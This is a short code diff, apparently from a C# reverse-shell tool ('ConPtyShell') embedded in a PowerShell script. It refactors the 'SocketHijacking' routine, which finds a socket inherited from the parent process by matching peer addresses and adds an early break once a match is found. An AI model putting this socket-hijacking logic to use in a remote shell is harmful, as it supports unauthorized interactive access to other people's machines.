@@ -783,20 +783,19 @@ public static class SocketHijacking
         
         foreach (IntPtr currentSocketHandle in currentProcessSockets)
         {
+            SOCKADDR_IN sockaddrCurrentProcess = new SOCKADDR_IN();
+            int sockaddrTargetProcessLen = Marshal.SizeOf(sockaddrCurrentProcess);
+            getpeername(currentSocketHandle, ref sockaddrCurrentProcess, ref sockaddrTargetProcessLen);
             foreach (IntPtr parentSocketHandle in parentProcessSockets)
             {
-                SOCKADDR_IN sockaddrCurrentProcess = new SOCKADDR_IN();
                 SOCKADDR_IN sockaddrParentProcess = new SOCKADDR_IN();
-                int sockaddrTargetProcessLen = Marshal.SizeOf(sockaddrCurrentProcess);
                 int sockaddrParentProcessLen = Marshal.SizeOf(sockaddrParentProcess);
-                if (
-                    (getpeername(currentSocketHandle, ref sockaddrCurrentProcess, ref sockaddrTargetProcessLen) == 0) &&
-                    (getpeername(parentSocketHandle, ref sockaddrParentProcess, ref sockaddrParentProcessLen) == 0) &&
-                    (sockaddrCurrentProcess.sin_addr == sockaddrParentProcess.sin_addr && sockaddrCurrentProcess.sin_port == sockaddrParentProcess.sin_port)
-                   )
+                getpeername(parentSocketHandle, ref sockaddrParentProcess, ref sockaddrParentProcessLen);
+                if (sockaddrCurrentProcess.sin_addr == sockaddrParentProcess.sin_addr && sockaddrCurrentProcess.sin_port == sockaddrParentProcess.sin_port)
                 {
                     Console.WriteLine("debug: found inherited socket! handle --> 0x" + currentSocketHandle.ToString("X4"));
                     inheritedSocket = currentSocketHandle;
+                    break;
                 }
                 else
                 {
@@ -1833,6 +1832,7 @@ class MainClass
         Console.Out.Write(ConPtyShellMainClass.ConPtyShellMain(args));
     }
 }
+
 
 
 "@;
